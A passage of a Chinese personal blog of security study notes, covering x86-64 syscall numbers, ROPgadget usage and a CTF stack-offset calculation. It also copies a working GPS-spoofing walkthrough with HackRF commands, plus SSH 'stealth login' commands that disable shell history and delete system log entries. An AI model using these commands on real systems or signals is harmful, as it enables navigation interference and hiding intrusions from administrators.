class="line">        <span class="comment">#define __NR_io_cancel 210</span></span><br><span class="line">        <span class="comment">#define __NR_get_thread_area 211</span></span><br><span class="line">        <span class="comment">#define __NR_lookup_dcookie 212</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create 213</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_ctl_old 214</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_wait_old 215</span></span><br><span class="line">        <span class="comment">#define __NR_remap_file_pages 216</span></span><br><span class="line">        <span class="comment">#define __NR_getdents64 217</span></span><br><span class="line">        <span class="comment">#define __NR_set_tid_address 218</span></span><br><span class="line">        <span class="comment">#define __NR_restart_syscall 219</span></span><br><span class="line">        <span class="comment">#define __NR_semtimedop 220</span></span><br><span class="line">        <span class="comment">#define __NR_fadvise64 221</span></span><br><span class="line">        <span class="comment">#define __NR_timer_create 222</span></span><br><span class="line">        <span class="comment">#define __NR_timer_settime 223</span></span><br><span class="line">        <span class="comment">#define __NR_timer_gettime 224</span></span><br><span class="line">        <span class="comment">#define __NR_timer_getoverrun 225</span></span><br><span class="line">        <span class="comment">#define __NR_timer_delete 226</span></span><br><span class="line">        <span class="comment">#define __NR_clock_settime 227</span></span><br><span class="line">        <span class="comment">#define __NR_clock_gettime 228</span></span><br><span class="line">        <span class="comment">#define __NR_clock_getres 229</span></span><br><span class="line">        <span class="comment">#define __NR_clock_nanosleep 230</span></span><br><span class="line">        <span class="comment">#define __NR_exit_group 231</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_wait 232</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_ctl 233</span></span><br><span class="line">        <span class="comment">#define __NR_tgkill 234</span></span><br><span class="line">        <span class="comment">#define __NR_utimes 235</span></span><br><span class="line">        <span class="comment">#define __NR_vserver 236</span></span><br><span class="line">        <span class="comment">#define __NR_mbind 237</span></span><br><span class="line">        <span class="comment">#define __NR_set_mempolicy 238</span></span><br><span class="line">        <span class="comment">#define __NR_get_mempolicy 239</span></span><br><span class="line">        <span class="comment">#define __NR_mq_open 240</span></span><br><span class="line">        <span class="comment">#define __NR_mq_unlink 241</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedsend 242</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedreceive 243</span></span><br><span class="line">        <span class="comment">#define __NR_mq_notify 244</span></span><br><span class="line">        <span class="comment">#define __NR_mq_getsetattr 245</span></span><br><span class="line">        <span class="comment">#define __NR_kexec_load 246</span></span><br><span class="line">        <span class="comment">#define __NR_waitid 247</span></span><br><span class="line">        <span class="comment">#define __NR_add_key 248</span></span><br><span class="line">        <span class="comment">#define __NR_request_key 249</span></span><br><span class="line">        <span class="comment">#define __NR_keyctl 250</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_set 251</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_get 252</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init 253</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_add_watch 254</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_rm_watch 255</span></span><br><span class="line">        <span class="comment">#define __NR_migrate_pages 256</span></span><br><span class="line">        <span class="comment">#define __NR_openat 257</span></span><br><span class="line">        <span class="comment">#define __NR_mkdirat 258</span></span><br><span class="line">        <span class="comment">#define __NR_mknodat 259</span></span><br><span class="line">        <span class="comment">#define __NR_fchownat 260</span></span><br><span class="line">        <span class="comment">#define __NR_futimesat 261</span></span><br><span class="line">        <span class="comment">#define __NR_newfstatat 262</span></span><br><span class="line">        <span class="comment">#define __NR_unlinkat 263</span></span><br><span class="line">        <span class="comment">#define __NR_renameat 264</span></span><br><span class="line">        <span class="comment">#define __NR_linkat 265</span></span><br><span class="line">        <span class="comment">#define __NR_symlinkat 266</span></span><br><span class="line">        <span class="comment">#define __NR_readlinkat 267</span></span><br><span class="line">        <span class="comment">#define __NR_fchmodat 268</span></span><br><span class="line">        <span class="comment">#define __NR_faccessat 269</span></span><br><span class="line">        <span class="comment">#define __NR_pselect6 270</span></span><br><span class="line">        <span class="comment">#define __NR_ppoll 271</span></span><br><span class="line">        <span class="comment">#define __NR_unshare 272</span></span><br><span class="line">        <span class="comment">#define __NR_set_robust_list 273</span></span><br><span class="line">        <span class="comment">#define __NR_get_robust_list 274</span></span><br><span class="line">        <span class="comment">#define __NR_splice 275</span></span><br><span class="line">        <span class="comment">#define __NR_tee 276</span></span><br><span class="line">        <span class="comment">#define __NR_sync_file_range 277</span></span><br><span class="line">        <span class="comment">#define __NR_vmsplice 278</span></span><br><span class="line">        <span class="comment">#define __NR_move_pages 279</span></span><br><span class="line">        <span class="comment">#define __NR_utimensat 280</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_pwait 281</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd 282</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_create 283</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd 284</span></span><br><span class="line">        <span class="comment">#define __NR_fallocate 285</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_settime 286</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_gettime 287</span></span><br><span class="line">        <span class="comment">#define __NR_accept4 288</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd4 289</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd2 290</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create1 291</span></span><br><span class="line">        <span class="comment">#define __NR_dup3 292</span></span><br><span class="line">        <span class="comment">#define __NR_pipe2 293</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init1 294</span></span><br><span class="line">        <span class="comment">#define __NR_preadv 295</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev 296</span></span><br><span class="line">        <span class="comment">#define __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line">        <span class="comment">#define __NR_perf_event_open 298</span></span><br><span class="line">        <span class="comment">#define __NR_recvmmsg 299</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_init 300</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_mark 301</span></span><br><span class="line">        <span class="comment">#define __NR_prlimit64 302</span></span><br><span class="line">        <span class="comment">#define __NR_name_to_handle_at 303</span></span><br><span class="line">        <span class="comment">#define __NR_open_by_handle_at 304</span></span><br><span class="line">        <span class="comment">#define __NR_clock_adjtime 305</span></span><br><span class="line">        <span class="comment">#define __NR_syncfs 306</span></span><br><span class="line">        <span class="comment">#define __NR_sendmmsg 307</span></span><br><span class="line">        <span class="comment">#define __NR_setns 308</span></span><br><span class="line">        <span class="comment">#define __NR_getcpu 309</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_readv 310</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_writev 311</span></span><br><span class="line">        <span class="comment">#define __NR_kcmp 312</span></span><br><span class="line">        <span class="comment">#define __NR_finit_module 313</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setattr 314</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getattr 315</span></span><br><span class="line">        <span class="comment">#define __NR_renameat2 316</span></span><br><span class="line">        <span class="comment">#define __NR_seccomp 317</span></span><br><span class="line">        <span class="comment">#define __NR_getrandom 318</span></span><br><span class="line">        <span class="comment">#define __NR_memfd_create 319</span></span><br><span class="line">        <span class="comment">#define __NR_kexec_file_load 320</span></span><br><span class="line">        <span class="comment">#define __NR_bpf 321</span></span><br><span class="line">        <span class="comment">#define __NR_execveat 322</span></span><br><span class="line">        <span class="comment">#define __NR_userfaultfd 323</span></span><br><span class="line">        <span class="comment">#define __NR_membarrier 324</span></span><br><span class="line">        <span class="comment">#define __NR_mlock2 325</span></span><br><span class="line">        <span class="comment">#define __NR_copy_file_range 326</span></span><br><span class="line">        <span class="comment">#define __NR_preadv2 327</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev2 328</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#endif /* _ASM_X86_UNISTD_64_H */</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br/>

<br/>

<h1 id="ROPgadget工具"><a href="#ROPgadget工具" class="headerlink" title="ROPgadget工具"></a>ROPgadget工具</h1><p><strong>安装&amp;使用：</strong></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/109098446">(2条消息) ROPgadget 安装 错误处理 与使用_yongbaoii的博客-CSDN博客_ropgadget</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45556441/article/details/114631043">(2条消息) (Pwn)CTF工具 ROPgadget 的安装与使用介绍_半岛铁盒@的博客-CSDN博客_ropgadget命令</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1d7f0c56a323">ROPgadgets - 简书 (jianshu.com)</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">安装：</span><br><span class="line">	sudo apt-get install python-capstone</span><br><span class="line"> </span><br><span class="line">	git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"> </span><br><span class="line">	<span class="built_in">cd</span> ROPgadget</span><br><span class="line"> </span><br><span class="line">	sudo python setup.py install</span><br><span class="line">	</span><br><span class="line">使用：</span><br><span class="line">	ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span><br><span class="line">	查找可存储寄存器的代码</span><br><span class="line">	</span><br><span class="line">	ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">	查找字符串</span><br><span class="line">	</span><br><span class="line">	ROPgadget --binary rop  --only <span class="string">&#x27;int&#x27;</span></span><br><span class="line">	查找有int 0x80的地址</span><br><span class="line">	</span><br><span class="line">	......</span><br></pre></td></tr></table></figure>



<br/>

<br/>

<h1 id="偏移计算"><a href="#偏移计算" class="headerlink" title="偏移计算"></a>偏移计算</h1><p><strong>例1：</strong></p>
<p>题目链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall</a></p>
<p>其中有这么一段：</p>
<p><img src="image-20220315222546638.png" alt="image-20220315222546638"></p>
<p>前置ida反编译找到main函数处，tab键切至该界面，找到call指令对应的地址并在gdb中下断点：</p>
<p><img src="image-20220315223144227.png" alt="image-20220315223144227"></p>
<p><img src="image-20220315223426214.png" alt="image-20220315223426214"></p>
<p>ni单走，调试至该位置，查看到三句汇编指令（s地址装入eax，eax赋给esp，调用gets函数）</p>
<p><img src="image-20220315222941502.png" alt="image-20220315222941502"></p>
<p>再看到ebp指向0xffffd178，esp指向0xffffd0f0（但这并不是s的起始地址），0xffffd0f0处存储的0xffffd10c才是s在栈上的起始地址（要解释清楚的话，得画个栈的图，还得有汇编基础，汇编我目前就学了些皮毛，解释不了，只知道以后遇到这种类似的这样算偏移准没错）</p>
<p>。计算规则：ebp（0xffffd178）+  4（ebp上面的ret，覆盖ebp要4个字节）-  s起始地址（0xffffd10c）= 0x70 = 112（10进制，0x是16进制前缀）</p>
<p>建议对比ret2txt看（<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text%EF%BC%89">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text）</a></p>
<p>亟待补充的知识（写给个人看的）：汇编</p>
<p>需要复习的知识：栈</p>
<br/>





<br/>

<br/>











<br/>

<br/>

<p>注：个人笔记，重在个人看懂</p>
<br/>

<br/>

<p>链接：<a target="_blank" rel="noopener" href="https://sh4oba1.xyz/pages/4ba610/#%E6%A0%88%E6%BA%A2%E5%87%BA-rop">pwn基础 | Sh4oBa1’s blog</a></p>
<br/>

<p>链接(看ta的友链)：<a target="_blank" rel="noopener" href="https://sh4oba1.xyz/">Sh4oBa1’s blog</a></p>
<p>链接(看ta的友链)：<a target="_blank" rel="noopener" href="https://f4de-bak.github.io/">F4DE (f4de-bak.github.io)</a></p>
<p>链接：<a target="_blank" rel="noopener" href="https://x1hy9.github.io/">Kimengun的学习之路 (x1hy9.github.io)</a></p>
<p>链接：<a target="_blank" rel="noopener" href="https://0xtunan.github.io/2020/06/04/%E7%94%A8github-hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/">用github-hexo搭建博客 | TuNan’s Blogs (0xtunan.github.io)</a></p>
<br/>

<p>链接(无意中发现的有关软件破解的博客)：<a target="_blank" rel="noopener" href="https://blog.csdn.net/song_10/article/details/83720673">(2条消息) EAX寄存器（关键跳，关键CALL）_song_10的博客-CSDN博客_eax寄存器</a></p>
<p>链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/song_10">(2条消息) song_10的博客_song-10_CSDN博客-C++,python学习笔记,攻防世界领域博主</a></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p><br/><br/></p>
<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<p>GPS劫持：</p>
<p>暂时没空搞这个，为了防止原文被删除，本人在此copy一份</p>
<p>链接：<a target="_blank" rel="noopener" href="https://toutiao.io/posts/uax8a1p/preview">https://toutiao.io/posts/uax8a1p/preview</a></p>
<p><strong>0x00 原理介绍</strong></p>
<p>GPS劫持有一定的破坏强度，攻击者利用路由、伪基站等技术来伪造GPS信号用于产生虚假的定位，这个技术不仅仅针对于手机，对其他设备都有一定的威胁，安全问题令人深思</p>
<p>HackRF是一个完全开源的项目，不管从软件还是硬件，已经国产化。设备可以在淘宝买，前提是我们需要借助 HackRF One</p>
<p><img src="640.jpeg" alt="img"></p>
<p><strong>0x01 GPS动态轨迹伪造</strong></p>
<p>我们可以通过伪造一个定位来进行重放，可以借助Google Earth（官网可下）</p>
<p>首先点击添加路径</p>
<p><img src="640-16492519624892.jpeg" alt="img"></p>
<p>选定一段道路并自定义名称，在此我们选择在巴厘岛库塔海滩走一趟</p>
<p><img src="640-16492519649644.jpeg" alt="img"></p>
<p>将路径另存为到本地</p>
<p><img src="640-16492519668146.jpeg" alt="img"></p>
<p>在此注意定存为格式选择.kml</p>
<p><img src="640-16492519707248.jpeg" alt="img"></p>
<p>然后我们需要把.kml文件转换成NMEA格式</p>
<p>在此借助的工具在后台回复“GPS劫持”即可获得</p>
<p>点击“Load KML file”打开文件</p>
<p><img src="640-164925197371610.jpeg" alt="img"></p>
<p>导出为NMEA文件</p>
<p><img src="640-164925197641012.jpeg" alt="img"></p>
<p>下载GPS数据</p>
<p>下载地址:</p>
<p><a href="ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/">ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/</a></p>
<p>此地址为美国国家宇航局的GPS数据回传的ftp文件服务器</p>
<p>将.txt文件拖到Ubuntu虚拟机中</p>
<p><img src="640-164925197919214.jpeg" alt="img"></p>
<p>选择最新文件下载 n.Z 文件</p>
<p><img src="640-164925198134116.jpeg" alt="img"></p>
<p>下载GPS-SDR-SIM</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/osqzss/gps-sdr-sim.git</span><br></pre></td></tr></table></figure>

<p>若没有gcc可安装</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc</span><br></pre></td></tr></table></figure>

<p>进行编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd gps-sdr-simgcc gpssim.c -lm -O3 -o gps-sdr-sim</span><br></pre></td></tr></table></figure>

<p><img src="640-164925198384318.jpeg" alt="img"></p>
<p>gps-sdr-sim模块参数</p>
<p><img src="640-164925198558120.jpeg" alt="img"></p>
<p>运行， 生成 gpssim.bin 文件</p>
<p>./gps-sdr-sim -e &lt;导航电文文件&gt; -u &lt;轨迹文件&gt; -b 8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gps-sdr-sim -e brdc3650.19n -g position.txt -b 8</span><br></pre></td></tr></table></figure>

<p><img src="640-164925198730622.jpeg" alt="img"></p>
<p>最后使用 HackRF One 重放数据</p>
<p>hackrf_transfer -t&lt;目标数据文件&gt;-f&lt;发射频率&gt;-s&lt;采样频率&gt;-a&lt;是否开启增益&gt;-x&lt;增益值&gt;-R</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 47 –R</span><br></pre></td></tr></table></figure>

<p><em><strong>*0x02 GPS静态定位伪造*</strong></em></p>
<p>同样下载最新 n.Z 文件</p>
<p>下载地址:</p>
<p><a href="ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/">ftp://cddis.gsfc.nasa.gov/pub/gps/data/daily/2019/brdc/</a></p>
<p><img src="640-164925198974124.jpeg" alt="img"></p>
<p>设置经纬度并生成数据样本</p>
<p><strong>这里的经纬度我们选择巴厘岛的经纬度</strong></p>
<p><strong>经度：</strong><strong>-8.616147</strong></p>
<p><strong>纬度：****115.674842</strong></p>
<p>**<br>**</p>
<p>./gps-sdr-sim -e &lt;GPS导航电文文件&gt; -l &lt;经度，纬度，海拔&gt; -b &lt;采样精度&gt;</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gps-sdr-sim -e brdc3650.19n -l -8.616147,115.674842,100 -b 8</span><br></pre></td></tr></table></figure>

<p><img src="640-164925199247626.jpeg" alt="img"></p>
<p>插上Hackrf，发射GPS数据开始伪造GPS信号</p>
<p>hackrf_transfer -t&lt;目标数据文件&gt;-f&lt;发射频率&gt;-s&lt;采样频率&gt;-a&lt;是否开启增益&gt;-x&lt;增益值&gt;-R</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 0 -R</span><br></pre></td></tr></table></figure>

<p>HackRF One 发送完GPS信号100秒后会自动停止，若想循环发送信号，加参数-R，过程需要几十秒的等待时间</p>
<p>这时候我们发现自己的定位已经在巴厘岛，说明<strong>欺骗成功</strong></p>
<p><img src="640-164925199651728.jpeg" alt="img"></p>
<p>本文仅用于学习研究，切勿用于违法途径！</p>
<br/>

<br/>

<p><strong>SSH隐身登录：</strong></p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41661056/article/details/103820951">https://blog.csdn.net/qq_41661056/article/details/103820951</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#远程登录w查看不到</span><br><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br><span class="line"></span><br><span class="line">#不记录ssh公钥在本地.ssh目录中</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br><span class="line"></span><br><span class="line">#不留下.bash_history</span><br><span class="line">unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0</span><br><span class="line"></span><br><span class="line">#删除部分日志,比如以当天日期或者自己的登录ip</span><br><span class="line">sed  -i &#x27;/当前时间/&#x27;d  /var/log/messages</span><br></pre></td></tr></table></figure>

<br/>

<br/>

<p><strong>WINDOWS 日志：</strong></p>
<p>链接：<a target="_blank" rel="noopener" href="https://www.const27.com/2021/09/03/windows&linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/">windows日志</a></p>
<br/>

<br/>

<p><strong>基础免杀手法暴风吸入：</strong></p>
<p>链接：<a target="_blank" rel="noopener" href="https://www.const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/">免杀</a></p>
<p><strong>some blogs：</strong></p>
<p>链接：<a target="_blank" rel="noopener" href="https://www.const27.com/">https://www.const27.com/</a></p>
<p>哈哈哈，一篇比较有意思的博客：<a target="_blank" rel="noopener" href="https://lanyundev.vercel.app/posts/41390.html#7-%E7%94%A8N%E5%B1%82%E7%A7%81%E4%BA%BA%EF%BC%88%E5%85%B1%E7%94%A8%EF%BC%89VPN%E5%90%8E%E5%88%A0%E6%8E%89VPN%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%8F%91%E5%B8%96%E4%BA%BA%E6%97%A0QQ">浅谈网警抓人全过程 (即使有 VPN) | LanYun の Blog (lanyundev.vercel.app)</a></p>
<br/>

<br/>

<p>你不喜欢被束缚，你要去争取自己想要的生活。</p>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/02/09/%E7%AC%94%E8%AE%B0/" rel="prev" title="笔记">
                  <i class="fa fa-chevron-left"></i> 笔记
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/02/17/PWN/" rel="next" title="PWN">
                  PWN <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xiaoxiaoxy</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
